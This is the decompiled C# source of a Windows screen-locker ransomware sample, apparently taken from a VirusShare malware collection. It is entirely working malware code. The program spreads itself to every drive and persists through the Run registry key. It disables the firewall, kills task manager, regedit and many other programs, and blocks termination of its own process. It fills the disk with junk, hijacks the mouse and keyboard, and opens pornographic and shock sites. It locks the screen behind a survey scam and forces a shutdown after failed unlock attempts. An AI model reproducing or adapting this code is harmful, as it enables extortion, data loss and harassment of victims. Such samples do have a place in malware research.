// Decompiled with JetBrains decompiler
// Type: Program.frmMain
// Assembly: 12345, Version=19.11.12.0, Culture=neutral, PublicKeyToken=null
// MVID: D4869D88-ABC2-4AA2-83C9-54B1D8083E91
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.jtdh-9cae95136a66c42c5250b6de79b4451c91120c97171d84fd77f8e2eeb05f5cee.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Program
{
  public class frmMain : Form
  {
    private const int AppcommandVolumeMute = 524288;
    private const int WmAppcommand = 793;
    private IContainer components;
    private WebBrowser _wbrSite;
    private System.Windows.Forms.Timer _tmrMute;
    private System.Windows.Forms.Timer _tmrFirewall;
    private Button _btnSite;
    private System.Windows.Forms.Timer _tmrCloser;
    private Label _lblText;
    private Button _btnCheck;
    private TextBox _txtCode;
    private Label _lblCode;
    private System.Windows.Forms.Timer _tmrBeeper;
    private System.Windows.Forms.Timer _tmrDocuments;
    private System.Windows.Forms.Timer _tmrMode;
    private System.Windows.Forms.Timer _tmrUrls;
    private System.Windows.Forms.Timer _tmrMouse;
    private System.Windows.Forms.Timer _tmrRKey;
    private System.Windows.Forms.Timer _tmrOpenDisk;
    private System.Windows.Forms.Timer _tmrMessage;
    private System.Windows.Forms.Timer _tmrCenter;
    private System.Windows.Forms.Timer _tmrClipboard;
    private System.Windows.Forms.Timer _tmrRegister;
    private Panel _pnlCompo;
    private bool _dWrite = true;
    private bool _cClose;
    private int _cTry = 1;
    private int _curLnk;
    private string regKey = "nvidia";
    private string[] _arrDisables;
    private string _fHdd;
    private string _swapMBtn;
    private string _hTBar;
    private bool _onScr;
    private readonly Random _r = new Random();
    private Point _pn;
    private string[] _urls;
    private string[] _codes;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(61, 4);
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.MinimizeBox = false;
      this.MaximizeBox = false;
      this.Name = nameof (frmMain);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.TopMost = true;
      this.FormClosing += new FormClosingEventHandler(this.frmMain_FormClosing);
      this.Load += new EventHandler(this.frmMain_Load);
      this.ResumeLayout(false);
    }

    public frmMain()
    {
      this.InitializeComponent();
      switch ("AppData")
      {
        case "AppData":
          this.Installer(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
          break;
        case "Desktop":
          this.Installer(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
          break;
        case "Documents":
          this.Installer(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
          break;
        case "Music":
          this.Installer(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
          break;
        case "Picture":
          this.Installer(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
          break;
      }
    }

    private void Installer(string pth)
    {
      try
      {
        if (Application.StartupPath == pth)
          return;
        File.Copy(Application.ExecutablePath, pth + "\\" + this.regKey + ".exe");
        Process.Start(pth + "\\" + this.regKey + ".exe");
        this._cClose = true;
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
      }
    }

    private void LoadControls()
    {
      string str1 = "y";
      string str2 = "\r\nYour computer is locked.To unlock you need to follow theese steps:\r\n\r\n- Click on SITE on the left side\r\n- Click on the the padlock image\r\n- Choose an survey from red list\r\n- Complete the survey and download password\r\n- Write the password on left site and click VERIFY\r\n\r\nNow your computer is unlocked and is same as before.\r\nYou cant unlock your computer if you dont download the password.\r\n";
      if (str1 == "y")
        this._onScr = true;
      this.components = (IContainer) new Container();
      this._lblText = new Label();
      this._btnSite = new Button();
      this._btnCheck = new Button();
      this._lblCode = new Label();
      this._txtCode = new TextBox();
      this._tmrCenter = new System.Windows.Forms.Timer(this.components);
      this._tmrCenter.Enabled = false;
      this._tmrCenter.Interval = 8000;
      this._tmrCenter.Tick += new EventHandler(this.tmrCenter_Tick);
      this._tmrUrls = new System.Windows.Forms.Timer(this.components);
      this._tmrUrls.Tick += new EventHandler(this.tmrSites_Tick);
      this._tmrFirewall = new System.Windows.Forms.Timer(this.components);
      this._tmrFirewall.Interval = 5000;
      this._tmrFirewall.Tick += new EventHandler(this.tmrFireWall_Tick);
      this._tmrCloser = new System.Windows.Forms.Timer(this.components);
      this._tmrCloser.Interval = 200;
      this._tmrCloser.Tick += new EventHandler(this.tmrClose_Tick);
      this._tmrBeeper = new System.Windows.Forms.Timer(this.components);
      this._tmrBeeper.Interval = 1000;
      this._tmrBeeper.Tick += new EventHandler(this.tmrBeeper_Tick);
      this._tmrDocuments = new System.Windows.Forms.Timer(this.components);
      this._tmrDocuments.Tick += new EventHandler(this.tmrDocuments_Tick);
      this._tmrMode = new System.Windows.Forms.Timer(this.components);
      this._tmrMode.Tick += new EventHandler(this.tmrModus_Tick);
      this._tmrMouse = new System.Windows.Forms.Timer(this.components);
      this._tmrMouse.Tick += new EventHandler(this.tmrMoveMouse_Tick);
      this._tmrRKey = new System.Windows.Forms.Timer(this.components);
      this._tmrRKey.Tick += new EventHandler(this.tmrRnKey_Tick);
      this._tmrOpenDisk = new System.Windows.Forms.Timer(this.components);
      this._tmrOpenDisk.Tick += new EventHandler(this.tmrOpenDisk_Tick);
      this._tmrMessage = new System.Windows.Forms.Timer(this.components);
      this._tmrMessage.Interval = 1000;
      this._tmrMessage.Tick += new EventHandler(this.tmrMessage_Tick);
      this._tmrRegister = new System.Windows.Forms.Timer(this.components);
      this._tmrRegister.Interval = 5000;
      this._tmrRegister.Tick += new EventHandler(this.tmrRegister_Tick);
      this._tmrMute = new System.Windows.Forms.Timer(this.components);
      this._tmrMute.Tick += new EventHandler(this.tmrMute_Tick);
      this._tmrClipboard = new System.Windows.Forms.Timer(this.components);
      this._tmrClipboard.Interval = 1000;
      this._tmrClipboard.Tick += new EventHandler(this.tmrClipboard_Tick);
      this._lblText.AutoSize = true;
      this._lblText.Name = "lblText";
      this._lblText.Size = new Size(286, 65);
      this._lblText.Text = "Please complete a survey in order to unlock your computer.\r\nEverything will be as before when you unlock your PC.\r\n\r\nDon't do this, and see what happens.\r\nThank you for your cooperation.";
      if (!this._onScr)
      {
        this.SuspendLayout();
        this._btnSite.Location = new Point(17, 103);
        this._btnSite.Name = "btnSite";
        this._btnSite.Size = new Size(75, 23);
        this._btnSite.TabIndex = 14;
        this._btnSite.Text = "Site";
        this._btnSite.UseVisualStyleBackColor = true;
        this._btnSite.Click += new EventHandler(this.btnURL_Click);
        this._lblText.Location = new Point(14, 9);
        this._lblText.TabIndex = 13;
        this._btnCheck.Location = new Point(224, 103);
        this._btnCheck.Name = "btnCheck";
        this._btnCheck.Size = new Size(75, 23);
        this._btnCheck.TabIndex = 12;
        this._btnCheck.Text = "Verify";
        this._btnCheck.UseVisualStyleBackColor = true;
        this._btnCheck.Click += new EventHandler(this.btnCheck_Click);
        this._txtCode.Location = new Point(91, 77);
        this._txtCode.Name = "txtUnCode";
        this._txtCode.Size = new Size(208, 20);
        this._txtCode.TabIndex = 11;
        this._txtCode.TextAlign = HorizontalAlignment.Center;
        this._lblCode.AutoSize = true;
        this._lblCode.Location = new Point(14, 80);
        this._lblCode.Name = "lblUnlock";
        this._lblCode.Size = new Size(71, 13);
        this._lblCode.TabIndex = 10;
        this._lblCode.Text = "Unlock code:";
        this.AcceptButton = (IButtonControl) this._btnCheck;
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(314, 137);
        this.Controls.Add((Control) this._btnSite);
        this.Controls.Add((Control) this._lblText);
        this.Controls.Add((Control) this._btnCheck);
        this.Controls.Add((Control) this._txtCode);
        this.Controls.Add((Control) this._lblCode);
        this.ResumeLayout(false);
        this.PerformLayout();
      }
      else
      {
        this._pnlCompo = new Panel();
        this._wbrSite = new WebBrowser();
        this._pnlCompo.SuspendLayout();
        this.SuspendLayout();
        this._pnlCompo.BackColor = System.Drawing.Color.Black;
        this._pnlCompo.Controls.Add((Control) this._lblText);
        this._pnlCompo.Controls.Add((Control) this._btnSite);
        this._pnlCompo.Controls.Add((Control) this._btnCheck);
        this._pnlCompo.Controls.Add((Control) this._lblCode);
        this._pnlCompo.Controls.Add((Control) this._txtCode);
        this._pnlCompo.Dock = DockStyle.Bottom;
        this._pnlCompo.Location = new Point(0, 401);
        this._pnlCompo.Name = "pnlOptions";
        this._pnlCompo.Size = new Size(804, 87);
        this._pnlCompo.TabIndex = 4;
        this._lblText.BackColor = System.Drawing.Color.Transparent;
        this._lblText.ForeColor = System.Drawing.Color.White;
        this._lblText.Location = new Point(506, 10);
        this._lblText.TabIndex = 4;
        this._btnSite.BackColor = SystemColors.Control;
        this._btnSite.ForeColor = System.Drawing.Color.Black;
        this._btnSite.Location = new Point(12, 52);
        this._btnSite.Name = "btnSite";
        this._btnSite.Size = new Size(75, 23);
        this._btnSite.TabIndex = 3;
        this._btnSite.Text = "Site";
        this._btnSite.UseVisualStyleBackColor = false;
        this._btnSite.Click += new EventHandler(this.btnURL_Click);
        this._btnCheck.BackColor = SystemColors.Control;
        this._btnCheck.ForeColor = System.Drawing.Color.Black;
        this._btnCheck.Location = new Point(137, 52);
        this._btnCheck.Name = "btnCheck";
        this._btnCheck.Size = new Size(75, 23);
        this._btnCheck.TabIndex = 2;
        this._btnCheck.Text = "Verify";
        this._btnCheck.UseVisualStyleBackColor = false;
        this._btnCheck.Click += new EventHandler(this.btnCheck_Click);
        this._lblCode.AutoSize = true;
        this._lblCode.BackColor = System.Drawing.Color.Transparent;
        this._lblCode.ForeColor = System.Drawing.Color.White;
        this._lblCode.Location = new Point(9, 10);
        this._lblCode.Name = "lblUnlockCode";
        this._lblCode.Size = new Size(71, 13);
        this._lblCode.TabIndex = 1;
        this._lblCode.Text = "Unlock code:";
        this._txtCode.Location = new Point(12, 26);
        this._txtCode.Name = "txtUnCode";
        this._txtCode.Size = new Size(200, 20);
        this._txtCode.TabIndex = 0;
        this._txtCode.TextAlign = HorizontalAlignment.Center;
        this._wbrSite.Dock = DockStyle.Fill;
        this._wbrSite.IsWebBrowserContextMenuEnabled = false;
        this._wbrSite.Location = new Point(0, 0);
        this._wbrSite.MinimumSize = new Size(20, 20);
        this._wbrSite.Name = "wbrSite";
        this._wbrSite.ScriptErrorsSuppressed = true;
        this._wbrSite.Size = new Size(804, 488);
        this._wbrSite.TabIndex = 5;
        this.AcceptButton = (IButtonControl) this._btnCheck;
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(804, 488);
        this.Controls.Add((Control) this._pnlCompo);
        this.Controls.Add((Control) this._wbrSite);
        this._pnlCompo.ResumeLayout(false);
        this._pnlCompo.PerformLayout();
        this.ResumeLayout(false);
      }
      if (str2 != "n")
      {
        if (!this._onScr)
        {
          if (str2 != this._lblText.Text)
          {
            this._lblText.Text = str2;
            if (this._lblText.Width + this._lblText.Location.X >= this.Width - 10)
              this.Width = this._lblText.Location.X + this._lblText.Width + 20;
            Point point = new Point();
            point.X = this._lblText.Location.X;
            point.Y = this._lblText.Location.Y + this._lblText.Height + 10;
            this._lblCode.Location = point;
            point.X = this._lblCode.Location.X + this._lblCode.Width + 5;
            this._txtCode.Location = point;
            if (this._lblText.Location.X + this._lblText.Width - this._txtCode.Location.X > this._txtCode.Width)
              this._txtCode.Width = this._lblText.Location.X + this._lblText.Width - this._txtCode.Location.X;
            point.X = this._lblText.Location.X;
            point.Y = this._lblCode.Location.Y + this._lblCode.Height + 15;
            this._btnSite.Location = point;
            point.X = this._txtCode.Location.X + this._txtCode.Width - this._btnCheck.Width;
            this._btnCheck.Location = point;
            this.Height = this._btnCheck.Location.Y + this._btnCheck.Height + 40;
          }
        }
        else if (str2 != this._lblText.Text)
        {
          this._lblText.Text = str2;
          if (this.Width < this._lblText.Location.X + this._lblText.Width)
            this.Width = this._lblText.Location.X + this._lblText.Width + 15;
          if (this._lblText.Location.Y + this._lblText.Height > this._pnlCompo.Height)
            this._pnlCompo.Height = this._lblText.Location.Y + this._lblText.Height + 10;
        }
      }
      this.CenterToScreen();
    }

    private void btnCheck_Click(object sender, EventArgs e)
    {
      try
      {
        if (this._txtCode.Text == frmMain.Decrypt(this._codes[this._curLnk], "deadline"))
          this.CorrectInput();
        else
          this.CheckInput();
        if (this._curLnk != this._urls.Length)
          return;
        this._cClose = true;
        this.Uninstall();
        Application.Exit();
      }
      catch
      {
      }
    }

    private void CheckInput()
    {
      if (this._cTry == 3)
      {
        frmMain.Exit();
      }
      else
      {
        int num = (int) MessageBox.Show("Warning: " + this._cTry.ToString() + ". You can only have 2 warnings before your system becomes unusable !");
        ++this._cTry;
      }
    }

    private void CorrectInput()
    {
      int num = (int) MessageBox.Show("Thank you.");
      this._txtCode.Text = "";
      ++this._curLnk;
      this.OpenLink();
    }

    private void btnURL_Click(object sender, EventArgs e) => this.OpenLink();

    private void OpenLink()
    {
      try
      {
        if (!this._onScr)
          Process.Start(frmMain.Decrypt(this._urls[this._curLnk], "deadline"));
        else
          this._wbrSite.Navigate(frmMain.Decrypt(this._urls[this._curLnk], "deadline"));
      }
      catch
      {
      }
    }

    private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        if (!this._cClose)
        {
          e.Cancel = true;
          this.CheckInput();
        }
        else
        {
          this.Uninstall();
          Application.Exit();
        }
      }
      catch
      {
      }
    }

    private void Uninstall()
    {
      if (!this._cClose)
        return;
      this._tmrRegister.Enabled = false;
      this._tmrCloser.Enabled = false;
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.regKey, (object) "");
        if (this._swapMBtn == "y")
          frmMain.SwapMouseB(0);
        if (this._hTBar == "y")
          frmMain.TaskBar(1);
        if (this._fHdd == "y")
        {
          this._dWrite = false;
          Thread.Sleep(1000);
          try
          {
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmps.bin");
          }
          catch
          {
          }
        }
        foreach (string arrDisable in this._arrDisables)
        {
          if (arrDisable == "explorer")
            Process.Start("explorer.exe");
        }
      }
      catch
      {
      }
    }

    private void tmrRegister_Tick(object sender, EventArgs e)
    {
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.regKey, (object) Application.ExecutablePath);
      }
      catch
      {
      }
    }

    private static void MusicPlayer()
    {
      while (true)
      {
        Console.Beep(902, 402);
        Console.Beep(1002, 402);
        Console.Beep(802, 402);
        Console.Beep(402, 402);
        Console.Beep(602, 1602);
      }
    }

    private void tmrCenter_Tick(object sender, EventArgs e) => this.CenterToScreen();

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    private static void TaskBar(int e)
    {
      try
      {
        frmMain.ShowWindow(frmMain.FindWindow("Shell_TrayWnd", ""), e);
      }
      catch
      {
      }
    }

    private static void Exit()
    {
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = "shutdown.exe",
            Arguments = "-s -f -t 0",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
    }

    [DllImport("user32.dll")]
    private static extern int SwapMouseButton(int swap);

    private static void SwapMouseB(int i)
    {
      try
      {
        frmMain.SwapMouseButton(i);
      }
      catch
      {
      }
    }

    private static void Execution()
    {
      try
      {
        Process currentProcess = Process.GetCurrentProcess();
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != currentProcess.Id)
          {
            try
            {
              process.Kill();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    private void Locker()
    {
      while (true)
      {
        Thread.Sleep(150);
        Cursor.Position = this._pn;
      }
    }

    private void tmrFireWall_Tick(object sender, EventArgs e)
    {
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = "netsh.exe",
            Arguments = "firewall set opmode disable",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
    }

    private void RStream()
    {
      try
      {
        using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmps.bin", FileMode.Append))
        {
          byte[] buffer = new byte[1];
          while (this._dWrite)
          {
            this._r.NextBytes(buffer);
            fileStream.WriteByte(buffer[0]);
          }
        }
      }
      catch
      {
      }
    }

    private static void Beeps() => Console.Beep();

    private void tmrClose_Tick(object sender, EventArgs e)
    {
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in Process.GetProcesses())
      {
        foreach (string arrDisable in this._arrDisables)
        {
          if (process.ProcessName.ToLower().Contains(arrDisable))
          {
            if (process.Id != currentProcess.Id)
            {
              try
              {
                process.Kill();
              }
              catch
              {
              }
            }
          }
        }
      }
    }

    private void tmrDocuments_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrDocuments.Interval = this._r.Next(5000, 120000);
        switch (this._r.Next(0, 4))
        {
          case 0:
            Process.Start("mspaint.exe");
            break;
          case 1:
            Process.Start("write.exe");
            break;
          case 2:
            Process.Start("calc.exe");
            break;
          case 3:
            Process.Start("utilman.exe");
            break;
          case 4:
            Process.Start("explorer.exe");
            break;
          case 5:
            Process.Start("notepad.exe");
            break;
        }
      }
      catch
      {
      }
    }

    private void tmrBeeper_Tick(object sender, EventArgs e)
    {
      this._tmrBeeper.Interval = this._r.Next(1000, 15000);
      new Thread(new ThreadStart(frmMain.Beeps)).Start();
    }

    private void tmrClipboard_Tick(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText("-");
      }
      catch
      {
      }
    }

    private void tmrModus_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrMode.Interval = this._r.Next(1000, 120000);
        Process currentProcess = Process.GetCurrentProcess();
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != currentProcess.Id && process.ProcessName.ToLower() != "firefox" && process.ProcessName.ToLower() != "chrome" && process.ProcessName != "iexplore" && process.ProcessName.ToLower() != "safari")
          {
            if (process.ProcessName.ToLower() != "opera")
            {
              try
              {
                process.Kill();
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    private static string RString(int crs)
    {
      try
      {
        Random random = new Random((int) DateTime.Now.Ticks);
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < crs; ++index)
        {
          char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
          stringBuilder.Append(ch);
        }
        return stringBuilder.ToString();
      }
      catch
      {
        return (string) null;
      }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SendMessageW(
      IntPtr hWnd,
      int msg,
      IntPtr wParam,
      IntPtr lParam);

    private void CVolume()
    {
      try
      {
        frmMain.SendMessageW(this.Handle, 793, this.Handle, (IntPtr) 524288);
      }
      catch
      {
      }
    }

    private void tmrRnKey_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrRKey.Interval = this._r.Next(5000, 120000);
        SendKeys.Send(frmMain.RString(this._r.Next(1, 30)));
      }
      catch
      {
      }
    }

    private void tmrMessage_Tick(object sender, EventArgs e)
    {
      this._tmrMessage.Interval = this._r.Next(1000, 120000);
      frmMain.ShowMessage();
    }

    private void tmrMoveMouse_Tick(object sender, EventArgs e)
    {
      Point point = new Point();
      int num1 = this._r.Next(2);
      int num2 = this._r.Next(2);
      this._tmrMouse.Interval = this._r.Next(1000, 60000);
      point.X = num1 != 1 ? Control.MousePosition.X - this._r.Next(1, 300) : Control.MousePosition.X + this._r.Next(1, 300);
      point.Y = num2 != 1 ? Control.MousePosition.Y - this._r.Next(1, 300) : Control.MousePosition.Y + this._r.Next(1, 300);
      Cursor.Position = point;
    }

    private void tmrMute_Tick(object sender, EventArgs e)
    {
      this._tmrMute.Interval = this._r.Next(1000, 60000);
      new Thread(new ThreadStart(this.CVolume)).Start();
    }

    private void tmrOpenDisk_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrOpenDisk.Interval = this._r.Next(5000, 60000);
        new Thread(new ThreadStart(frmMain.OpenTrays)).Start();
      }
      catch
      {
      }
    }

    private void tmrSites_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrUrls.Interval = this._r.Next(5000, 120000);
        switch (this._r.Next(0, 7))
        {
          case 0:
            Process.Start("http://www.1guy2needles.com/");
            break;
          case 1:
            Process.Start("http://meatspin.com");
            break;
          case 2:
            Process.Start("http://loltrain.com");
            break;
          case 3:
            Process.Start("http://youporngay.com");
            break;
          case 4:
            Process.Start("http://ashemaletube.com");
            break;
          case 5:
            Process.Start("http://www.asspong.com/");
            break;
          case 6:
            Process.Start("http://www.eatyoursoup.com/");
            break;
          case 7:
            Process.Start("http://www.mudfall.com/");
            break;
        }
      }
      catch
      {
      }
    }

    [DllImport("winmm.dll")]
    private static extern void mciSendStringA(
      string lpstrCommand,
      string lpstrReturnString,
      long uReturnLength,
      long hwndCallback);

    private static void OpenTrays()
    {
      try
      {
        frmMain.mciSendStringA("set CDAudio door open", "", (long) sbyte.MaxValue, 0L);
      }
      catch
      {
      }
    }

    private static string Decrypt(string text, string pass)
    {
      try
      {
        byte[] buffer = Convert.FromBase64String(text);
        byte[] bytes = new PasswordDeriveBytes(pass, (byte[]) null).GetBytes(32);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.Mode = CipherMode.CBC;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes, Encoding.ASCII.GetBytes("tu79zaii340t89u2"));
        MemoryStream memoryStream = new MemoryStream(buffer);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
        byte[] numArray = new byte[buffer.Length];
        int count = cryptoStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return Encoding.UTF8.GetString(numArray, 0, count);
      }
      catch
      {
        return (string) null;
      }
    }

    private void frmMain_Load(object sender, EventArgs e)
    {
      this.LoadControls();
      try
      {
        this._pn = Cursor.Position;
        string str1 = "y";
        string str2 = "y";
        string str3 = "y";
        string str4 = "%openfiles%";
        string str5 = "%opensites%";
        string str6 = "y";
        string str7 = "%randomkeys%";
        string str8 = "y";
        string str9 = "y";
        string str10 = "y";
        string str11 = "y";
        string str12 = "%aggressivemode%";
        string str13 = "%onexecution%";
        this._swapMBtn = "%swapmouse%";
        this._hTBar = "%hidetaskbar%";
        string str14 = "%stopfirewall%";
        string str15 = "%playsong%";
        string str16 = "%showmessagebox%";
        string text = "%messageboxmessage%";
        string caption = "%messageboxtitle%";
        string s1 = "0";
        string str17 = "%changevolume%";
        this._arrDisables = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.regedit.explorer.skype.aim.steam.origin.utorrent.bittorrent.desura.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.tbb-firefox.torch.manycam.gimp.openvpntray.itunes.pidgin.recuva.7zfm.thunderbird.paintdotnet".Split('.');
        this._fHdd = "%filldisk%";
        string str18 = "%lockmousepos%";
        string str19 = "%protectprocess%";
        string s2 = "n";
        string str20 = "y";
        string str21 = "rx5C0OxWxjxdLqCx3LeHq68LLypYVkLZ30U+Vn/4bTc=";
        string str22 = "+mNLfENZ8fKAWezvSFhmDQ==";
        string[] separator = new string[1]{ "]||[" };
        this._urls = str21.Split(separator, StringSplitOptions.None);
        this._codes = str22.Split(separator, StringSplitOptions.None);
        if (str20 == "y")
        {
          try
          {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
              try
              {
                File.Copy(Application.ExecutablePath, drive.RootDirectory.ToString() + Path.GetFileName(Application.ExecutablePath));
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
        }
        if (str1 == "y")
          this._tmrRegister.Enabled = true;
        int result;
        int.TryParse(s1, out result);
        if (str19 == "y")
          frmMain.Protect();
        if (result != 0)
          Thread.Sleep(result);
        if (this._arrDisables[0] != "")
          this._tmrCloser.Enabled = true;
        if (str2 == "y")
          this._tmrClipboard.Enabled = true;
        if (str3 == "y")
          this._tmrOpenDisk.Enabled = true;
        if (str4 == "y")
          this._tmrDocuments.Enabled = true;
        if (str5 == "y")
          this._tmrUrls.Enabled = true;
        if (str6 == "y")
          this._tmrMouse.Enabled = true;
        if (str7 == "y")
          this._tmrRKey.Enabled = true;
        if (str8 == "y")
          this._tmrBeeper.Enabled = true;
        if (str9 == "y")
          new Thread(new ThreadStart(frmMain.Calus))
          {
            IsBackground = true
          }.Start();
        if (str11 == "y")
          this._tmrMessage.Enabled = true;
        if (str12 == "y")
          this._tmrMode.Enabled = true;
        if (str13 == "y")
          frmMain.Execution();
        if (this._swapMBtn == "y")
          frmMain.SwapMouseB(1);
        if (this._hTBar == "y")
          frmMain.TaskBar(0);
        if (str14 == "y")
          this._tmrFirewall.Enabled = true;
        if (str15 == "y")
          new Thread(new ThreadStart(frmMain.MusicPlayer))
          {
            IsBackground = true
          }.Start();
        if (str17 == "y")
          this._tmrMute.Enabled = true;
        if (this._fHdd == "y")
          new Thread(new ThreadStart(this.RStream)).Start();
        if (str18 == "y")
          new Thread(new ThreadStart(this.Locker))
          {
            IsBackground = true
          }.Start();
        if (str16 == "y")
        {
          int num = (int) MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        if (str10 != "y")
          Process.Start(frmMain.Decrypt(this._urls[this._curLnk], "deadline"));
        else
          this._wbrSite.Navigate(frmMain.Decrypt(this._urls[this._curLnk], "deadline"));
        if (s2 != "n")
        {
          this._tmrCenter.Interval = int.Parse(s2);
          this._tmrCenter.Enabled = true;
        }
        this.Focus();
      }
      catch
      {
      }
    }

    private static void ShowMessage()
    {
      Form owner = new Form();
      owner.Size = new Size(1, 1);
      owner.StartPosition = FormStartPosition.Manual;
      Rectangle virtualScreen = SystemInformation.VirtualScreen;
      owner.Location = new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10);
      owner.Show();
      owner.Focus();
      owner.BringToFront();
      owner.TopMost = true;
      owner.ShowIcon = false;
      owner.ShowInTaskbar = false;
      int num = (int) MessageBox.Show((IWin32Window) owner, "Complete the survey.", "", MessageBoxButtons.OK);
      owner.Dispose();
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    private static void Protect()
    {
      try
      {
        IntPtr currentProcess = frmMain.GetCurrentProcess();
        RawSecurityDescriptor securityDescriptor = frmMain.GetProcessSecurityDescriptor(currentProcess);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        byte[] numArray = new byte[securityDescriptor.BinaryLength];
        securityDescriptor.GetBinaryForm(numArray, 0);
        frmMain.SetKernelObjectSecurity(currentProcess, 4, numArray);
      }
      catch
      {
      }
    }

    private static void Calus()
    {
      int num = 0;
      while (true)
      {
        if (num == 50)
          num = 0;
        ++num;
      }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      out uint lpnLengthNeeded);

    private static RawSecurityDescriptor GetProcessSecurityDescriptor(
      IntPtr processHandle)
    {
      try
      {
        byte[] pSecurityDescriptor = new byte[0];
        uint lpnLengthNeeded;
        frmMain.GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
        byte[] binaryForm;
        return lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue || !frmMain.GetKernelObjectSecurity(processHandle, 4, binaryForm = new byte[(IntPtr) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
      }
      catch
      {
        return (RawSecurityDescriptor) null;
      }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [System.Flags]
    private enum ProcessAccessRights
    {
      Synchronize = 1048576, // 0x00100000
      StandardRightsRequired = 983040, // 0x000F0000
      ProcessAllAccess = 2035711, // 0x001F0FFF
    }
  }
}
